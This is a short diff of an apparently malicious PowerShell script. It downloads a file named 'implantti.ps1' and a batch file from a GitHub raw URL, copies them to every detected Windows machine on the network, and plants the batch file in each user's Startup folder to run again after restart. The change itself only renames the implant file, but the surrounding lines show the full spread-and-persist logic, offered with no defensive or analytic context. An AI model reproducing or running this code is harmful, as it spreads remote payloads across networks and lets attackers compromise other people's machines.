@@ -65,9 +65,9 @@ $windowsDevices = $windowsDevices | Sort-Object -Unique
 
 Write-Host "Detected Windows machines: $($windowsDevices -join ', ')"
 
-$DiscordFileUrl = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/implantti.ps1"
+$DiscordFileUrl = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/implantt1.ps1"
 $DiscordFileUrl2 = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/avaus.bat"
-$DestinationPath = "$sharedFolder\implantti.ps1"
+$DestinationPath = "$sharedFolder\implantt1.ps1"
 $DestinationPath2 = "$sharedFolder\avaus.bat"
 
 # Download the file
@@ -82,7 +82,7 @@ try {
 # 5. File to be copied and destination path
 $sourceFile = $DestinationPath
 $sourceFile2 = $DestinationPath2
-$targetPath = "Users\$env:USERNAME\AppData\Local\Temp\implantti.ps1"
+$targetPath = "Users\$env:USERNAME\AppData\Local\Temp\implantt1.ps1"
 $targetPath2 = "Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\avaus.bat"
 # 6. Copy file to each detected Windows machine and execute it
 
